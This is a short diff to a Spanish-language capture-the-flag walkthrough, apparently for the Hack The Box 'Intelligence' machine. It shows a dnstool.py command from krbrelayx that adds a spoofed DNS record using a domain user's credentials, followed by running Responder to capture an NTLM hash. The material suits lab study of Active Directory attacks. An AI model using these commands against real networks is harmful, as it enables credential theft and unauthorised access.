@@ -253,8 +253,12 @@ Al leer vemos que es una tarea que se ejecuta a intervalos regulares de tiempo
 
 Usaremos el siguiente repositorio `https://github.com/dirkjanm/krbrelayx.git`
 
-Lo que vamos a hacer es suplantar la peticion dns que busca un sitio que empiece por web y que esa llamda con las credenciales las haga a nuestra propia maquina
+Lo que vamos a hacer es suplantar la petición dns que busca un sitio que empiece por web y que esa llamda con las credenciales las haga a nuestra propia maquina
 `python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webjaime -a add -t A -d 10.10.14.30 10.10.10.248`
 
 
 Ahora con el [[RESPONDER]] 
+`responder -I tun0`
+
+Estaremos interceptando el trafico, y ya sabiendo que la autenticación vienen hasta nuestra maquina, veremos un hash ntlm
+
